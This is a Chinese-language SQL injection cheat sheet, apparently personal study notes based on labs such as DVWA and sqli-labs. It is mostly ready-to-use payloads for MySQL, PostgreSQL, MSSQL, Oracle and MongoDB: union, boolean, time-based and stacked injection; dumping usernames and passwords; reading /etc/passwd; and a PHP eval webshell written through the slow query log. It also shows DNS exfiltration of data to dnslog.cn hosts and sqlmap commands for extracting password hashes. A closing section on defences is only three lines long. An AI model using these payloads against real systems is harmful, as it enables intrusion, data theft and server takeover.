# SQL注入分类

数字型:
select字段名from表名where id= 1;

```
http://www.sql.com/xxx.php?id=1
假设ID为存在注入的参数
http://www.sql.com/xxx.php?id=1'
语句报错
http://www.sql.com/xxx.php?id=1 and 1=1
页面正常返回结果
http://www.sql.com/xxx.php?id=1 and 1=2
页面返回错误
```

字符型:
select字段名from表名where id = 1;

```
http://www.sql.com/xxx.php?id=1
假设ID为存在注入的参数
http://www.sql.com/xxx.php?id=1'
语句报错
http://www.sql.com/xxx.php?id=1' and '1'='1页面正常返回结果
id ='$'
id ='1'
id ='1''
id = '1' and '1'='1'
http://www.sql.com/xxx.php?id=1' and '1'='2 页面返回错误
```

在学习owasp相关文章时，发现他们通常将sql注入攻击分为三类:

- 带内注入: 使用与注入sql代码相同的通道提取数据(即使用web 正常功能检索数据，并且检索的数据直接显示在网页中)，比如常见的显错注入。
- 带外注入: 使用其他渠道检索数据(比如将检索的数据通过dns或者电子邮件传输)。
- 盲注(也有称为推理注入) : 没有实际的数据传输，但是通过特定请求可以观察到sql服务器的异常行为，以此来推理出结果，比如常见的延时注入和堆叠注入。

更普遍的一种分类方式是按照效果分类，共有7类，分别是:

- 布尔注入
- 联合注入
- 显错注入
- 延时注入
- 宽字节注入
- 带外注入
- 堆叠注入

# 利用场景

1.获取管理员用户或者其他用户的账户信息

2.利用数据库的漏洞进行提权

3.获取数据库里面的敏感信息

4.更改数据库里面的数据

```sql
#MYSQL-root高权限读写注入

-读取文件：

UNION SELECT 1,load_file('d:/w.txt'),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17

-写入文件：

UNION SELECT 1,'xxxx',3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 into outfile 'd:/www.txt'

-路径获取：phpinfo,报错,字典等

-无法写入：secure_file_priv突破 注入中需要支持SQL执行环境，没有就需要借助phpmyadmin或能够直接连上对方数据库进行绕过

set global slow_query_log=1;
set global slow_query_log_file='shell路径';
select '<?php eval($_GET[A])?>' or SLEEP(1);



\#PostgreSQL-高权限读写注入

-测列数：

order by 4
and 1=2 union select null,null,null,null

-测显位：第2，3

and 1=2 union select 'null',null,null,null 错误
and 1=2 union select null,'null',null,null 正常
and 1=2 union select null,null,'null',null 正常
and 1=2 union select null,null,null,'null' 错误

-获取信息：

and 1=2 UNION SELECT null,version(),null,null
and 1=2 UNION SELECT null,current_user,null,null
and 1=2 union select null,current_database(),null,null

-获取数据库名：

and 1=2 union select null,string_agg(datname,','),null,null from pg_database

-获取表名：

1、and 1=2 union select null,string_agg(tablename,','),null,null from pg_tables where schemaname='public'
2、and 1=2 union select null,string_agg(relname,','),null,null from pg_stat_user_tables

-获取列名：

and 1=2 union select null,string_agg(column_name,','),null,null from information_schema.columns where table_name='reg_users'

-获取数据：

and 1=2 union select null,string_agg(name,','),string_agg(password,','),null from reg_users

-补充-获取dba用户（同样在DBA用户下，是可以进行文件读写的）：

and 1=2 union select null,string_agg(usename,','),null,null FROM pg_user WHERE usesuper IS TRUE

参考：https://www.freebuf.com/sectool/249371.html



\#MSSQL-sa高权限读写执行注入

-测列数：

order by 4
and 1=2 union all select null,null,null,null

-测显位：

and 1=2 union all select null,1,null,null
and 1=2 union all select null,null,'s',null

-获取信息：
@@version 获取版本信息
db_name() 当前数据库名字
user、system_user,current_user,user_name 获取当前用户名
@@SERVERNAME 获取服务器主机信息
and 1=2 union all select null,db_name(),null,null

-获取表名：

and 1=2  union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u'),null,null
union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype='u' and name not in ('manage')),null,null

-获取列名：

and 1=2  union all select null,(select top 1 col_name(object_id('manage'),1) from sysobjects),null,null
and 1=2  union all select null,(select top 1 col_name(object_id('manage'),2) from sysobjects),null,null
and 1=2  union all select null,(select top 1 col_name(object_id('manage'),3) from sysobjects),null,null
and 1=2  union all select null,(select top 1 col_name(object_id('manage'),4) from sysobjects),null,null

-获取数据：

and 1=2 union all select null,username, password ,null from manage

#Oracle
参考：https://www.cnblogs.com/peterpan0707007/p/8242119.html
测回显：and 1=2 union select '1','2' from dual

爆库：and 1=2 union select '1',(select table_name from user_tables where rownum=1) from dual

模糊爆库：and 1=2 union select '1',(select table_name from user_tables where rownum=1 and table_name like '%user%') from dual

爆列名：and 1=2 union select '1',(select column_name from all_tab_columns where rownum=1 and table_name='sns_users') from dual

爆其他列名：and 1=2 union select '1',(select column_name from all_tab_columns where rownum=1 and table_name='sns_users' and column_name not in ('USER_NAME')) from dual

爆数据：and 1=2 union select user_name,user_pwd from "sns_users"

爆其他数据：and 1=2 union select user_name,user_pwd from "sns_users" where USER_NAME<>'hu'

#Mongodb 看代码
参考：https://www.runoob.com/mongodb/mongodb-query.html
测回显：/new_list.php?id=1'}); return ({title:1,content:'2

爆库：  /new_list.php?id=1'}); return ({title:tojson(db),content:'1

爆表： /new_list.php?id=1'}); return ({title:tojson(db.getCollectionNames()),content:'1  

爆字段：/new_list.php?id=1'}); return ({title:tojson(db.Authority_confidential.find()[0]),content:'1

db.getCollectionNames()返回的是数组，需要用tojson转换为字符串

db.Authority_confidential是当前用的集合（表），find函数用于查询，0是第一条数据

```



# 漏洞危害

1.攻击者可以利用漏洞查询其他用户的用户凭据

2.攻击者可能控制数据库中的所有数据

3.提权安装后门木马

4.恶意操作，如清空数据库

# 检测方法

## 查询数据库版本

| 数据库类型       | 语句                                                         |
| ---------------- | ------------------------------------------------------------ |
| Microsoft, MySQL | `SELECT @@version`                                           |
| Oracle           | `SELECT * FROM v$version`或者`SELECT version FROM v$instance` |
| PostgreSQL       | `SELECT version()`                                           |

## 显错注入

```
SELECT first_name, last_name FROM users WHERE user_id = '1';
SELECT first_name, last_name FROM users WHERE user_id = '1'';
```

## 布尔注入

用来快速获取数据

```
SELECT first_name, last_name FROM users WHERE user_id = '1';
SELECT first_name, last_name FROM users WHERE user_id = '99' or 1=1 #'';
SELECT first_name, last_name FROM users WHERE user_id = '99' and 1=1 #'';
```

获取指定信息使用and,获取所有信息使用or

```
1' and ascii (substr (database(),4,1))>96 #真
1' and ascii (substr (database(),4,1))<97 #假
1' and ascii (substr (database(),4,1))<98 #真
ascii 97->a
dvwa

1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #

1' and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #
users的16进制
显示存在，说明uers表有8个字段。

```

## 联合注入

union关键词

```
SELECT [colums_name] from [table_name] or UNION SELECT x, y, z-
基于union查询需要保持列数一致这个逻辑
```

输入payload:  'union select 1,2 --'   相当于执行语句  mysql> select user_name , user_password from user_information where user_id=' 'union select 1,2--'';

当应用程序容易受到 SQL 注入攻击并且查询结果在应用程序的响应中返回时，该`UNION`关键字可用于从数据库中的其他表中检索数据。这会导致 SQL 注入 UNION 攻击。

该`UNION`关键字允许您执行一个或多个附加`SELECT`查询并将结果附加到原始查询。例如：

```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

此 SQL 查询将返回具有两列的单个结果集，其中包含来自 columns`a`和`b`in`table1`以及 columns`c`和`d`in `table2`的值。

要使`UNION`查询起作用，必须满足两个关键要求：

- 各个查询必须返回相同数量的列。
- 每列中的数据类型必须在各个查询之间兼容。

要进行 SQL 注入 UNION 攻击，您需要确保您的攻击满足这两个要求。这通常涉及弄清楚：

- 从原始查询返回了多少列？
- 从原始查询返回的哪些列具有合适的数据类型来保存注入查询的结果？



```
'union select load_file('/etc/passwd'),2 --  查看文件
```

```
1' union select 1,table_name from information_schema.tables where table_schema=database() #
查看所有表名
```

order字句查询列数

```
1' order by 1#
1' order by 2#
1' order by 3#
1' order by 4#
```

- 使用`NULL`作为注入`SELECT`查询返回值的原因是每列中的数据类型必须在原始查询和注入查询之间兼容。由于`NULL`可转换为每种常用数据类型，因此`NULL`在列数正确时使用可以最大限度地提高有效负载成功的机会。
- 在 Oracle 上，每个`SELECT`查询都必须使用`FROM`关键字并指定一个有效的表。Oracle 上有一个内置表`dual`，可用于此目的。所以注入的查询甲骨文将需要看起来像：`' UNION SELECT NULL FROM DUAL--`。
- 所描述的有效负载使用双破折号注释序列`--`来注释掉注入点之后的原始查询的其余部分。在 MySQL 上，双破折号序列后必须跟一个空格。或者，`#`可以使用散列字符来标识评论。

## 在单列中检索多个值

在前面的示例中，假设查询仅返回单个列。

通过将值连接在一起，您可以轻松地在此单列中检索多个值，最好包括一个合适的分隔符来区分组合值。例如，在 Oracle 上，您可以提交输入：

```
' UNION SELECT username || '~' || password FROM users--
```

这使用双管道序列`||`，它是 Oracle 上的字符串连接运算符。注入的查询将`username`和`password`字段的值连接在一起，由`~`字符分隔。

MySQL可以用

```
CONCAT(username,'-->',password)
```



## 延时注入

```
1' and sleep(6) #
1' and if(length(database())>0,sleep(9),1) #   转圈圈
1' and if(length(database())>3,sleep(9),1) #   转圈圈
1' and if(length(database())>4,sleep(9),1) #   不转圈圈
```

id是 1' and if(length(database())>0,sleep(9),1) # 明显延迟，说明数据库名的长度为4个字符;

抓包改参数id为

```
1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(4),1) #
```

明显延迟，说明数据库中的第一个表名长度为9个字符;

抓包改参数id为

```
1' and if((select count(column_name) from information_schema.columns where table_name=0x7573657273)=8,sleep(5),1) #
```

明显延迟，说明uers表有8个字段。

## 堆叠注入

堆叠注入就是将一堆sql语句叠加在一起执行，使用分号结束上一个语句再叠加其他语句一起执行

支持堆叠数据库类型：MYSQL MSSQL Postgresql等

```
';show databases;

';show tables;
```



## DNS利用

1.平台

http://www.dnslog.cn

http://admin.dnslog.link

http://ceye.io

2.应用场景：

解决不回显，反向连接，SQL注入，命令执行，SSRF等

SQL注入：

```
select load_file(concat('\\\\',(select database()),'.7logee.dnslog.cn\\aa'));

and (select load_file(concat('//',(select database()),'.69knl9.dnslog.cn/abc')))
```

命令执行：

```
ping %USERNAME%.7logee.dnslog.cn
```



# 完整的SQL注入攻击流程（mysql）

1.判断是否能够注入

```
http://xxx.com/Less-1/?id=1
```

2.判断表中存在几个字段

```
id=1' order by 4 --+

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

3.判断字段位置

```
id=1' and 1=2 union select 1,2,3 --+
```

4.爆所有库.

MYSQL5.0以上版本：自带的数据库名information_schema

information_schema：存储数据库下的数据库名及表名，列名信息的数据库

information_schema.tables：记录表名信息的表

information_schema.columns：记录列名信息表



```
id=1' and 1=2 union select 1,database(),3 --+   查看当前库

id=1' and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata --+

```

5.爆指定库的所有表

```
id=1' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --+

oracle:
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
```

6.爆指定表的所有字段

```
id=1' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='users' --+

oracle

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
```

7.爆出字段内容

```
id=1' and 1=2 union select 1,username,password from users where id=1 --+

id=1' and 1=2 union select 1,group_concat(username),group_concat(password) from security.users --+
```

### 注意：关于Oracle的特殊性

大多数数据库类型（Oracle 除外）都有一组称为信息模式的视图，它提供有关数据库的信息。

可以查询`information_schema.tables`以列出数据库中的表：

```sql
SELECT * FROM information_schema.tables
```

在 Oracle 上，可以通过稍微不同的查询获得相同的信息。

可以通过查询列出表`all_tables`：

```sql
SELECT * FROM all_tables
```

可以通过查询列出列`all_tab_columns`：

```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

在 Oracle 数据库上，每条`SELECT`语句都必须指定一个表来选择`FROM`。如果您的`UNION SELECT`攻击不从表中查询，您仍然需要包含关键字，`FROM`后跟有效的表名。

Oracle 上有一个名为的内置表`dual`，您可以将其用于此目的。例如：

```sql
UNION SELECT 'abc' FROM dual
```



# 使用sqlmap进行自动化攻击

扫描URL目标

```
sqlmap -u "xxx.com/Less-1/?id=1"
```

判断当前数据库用户权限 

```
sqlmap -u "xxx.com/Less-1/?id=1" --privileges -U 用户名 -v 1 
```

读取所有数据库用户或指定数据库用户的密码 

```
sqlmap -u "xxx.com/Less-1/?id=1" --users --passwords -v 2 

sqlmap -u "xxx.com/Less-1/?id=1" --passwords -U root -v 2 
```

查看所有库

```
sqlmap -u "xxx.com/Less-1/?id=1" -dbs
```

查看所有表

```
sqlmap -u "xxx.com/Less-1/?id=1" -D security --tables
```

查看表字段

```
sqlmap -u "xxx.com/Less-1/?id=1" -D security -T users --columns
```

查看表字段内容

```
sqlmap -u "xxx.com/Less-1/?id=1" -D security -T users --columns -C "username,password" -dump
```

进入sql-shell

```
 sqlmap -u "xxx.com/Less-1/?id=1" --sql-shell
```

随机agent

```
sqlmap -u "xxx.com/Less-1/?id=1" --random-agent
```

多线程

```
sqlmap -u "xxx.com/Less-1/?id=1" --threads=4
```

导出HTTP详细请求

```
sqlmap -u "xxx.com/Less-1/?id=1" -t http.log
```

带cookie注入

```
sqlmap -u "xxx.com/Less-1/?id=1" --cookie="PHPSESSID=1b5arqpjub0o45b27e3s8ukf8c; security=low"
```

```
--mobile				有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆 
--level=LEVEL			执行测试的等级(1-5， 默认为1)
--risk=RISK				执行测试的风险(0-3, 默认为1)
--time-sec=TIMESEC		DBMS响应的延迟时间(默认为5秒)
-U USER					用来进行枚举的数据库用户
--sql-query=QUERY		要执行的SQL语句
--tamper				指定脚本
```

# SQL注入与防御

1.过滤（输入验证）：检测用户输入的合法性确保输入的内容是正常数据，数据校验最重要的就是在服务端校验

2.禁止回显错误报告：禁止回显错误信息，提高攻击难度

3.预编译输入：PDO (PHP Data Objects)采用预处理的方式，事先创建SQL语句模板，并发送到资料库，预处理，占位符